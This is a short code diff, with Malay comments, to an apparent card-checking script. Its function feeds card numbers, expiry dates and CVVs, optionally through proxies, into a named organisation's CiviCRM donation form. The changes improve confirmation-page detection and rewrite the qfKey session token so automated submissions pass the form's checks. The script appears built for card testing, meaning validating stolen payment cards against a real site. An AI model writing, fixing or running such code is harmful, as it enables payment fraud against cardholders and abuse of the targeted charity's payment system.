@@ -385,9 +385,9 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            # AKTIFKAN CONFIRMATION PAGE
+            # AKTIFKAN CONFIRMATION PAGE MELALUI URL
             confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
-            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
+            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url or 'qfKey=' in response.url
             
             if confirm_btn or is_confirmation:
                 confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)
@@ -397,6 +397,13 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 confirm_post_url = form_action
                 if confirm_action:
                     confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
+
+                # Pastikan URL Confirm ada qfKey baru
+                if 'qfKey=' in confirm_post_url and f'qfKey={qfkey_to_use}' not in confirm_post_url:
+                    confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey_to_use}', confirm_post_url)
+                elif 'qfKey=' not in confirm_post_url:
+                    if '?' in confirm_post_url: confirm_post_url += f'&qfKey={qfkey_to_use}'
+                    else: confirm_post_url += f'?qfKey={qfkey_to_use}'
 
                 session.headers.update({
                     "Referer": response.url
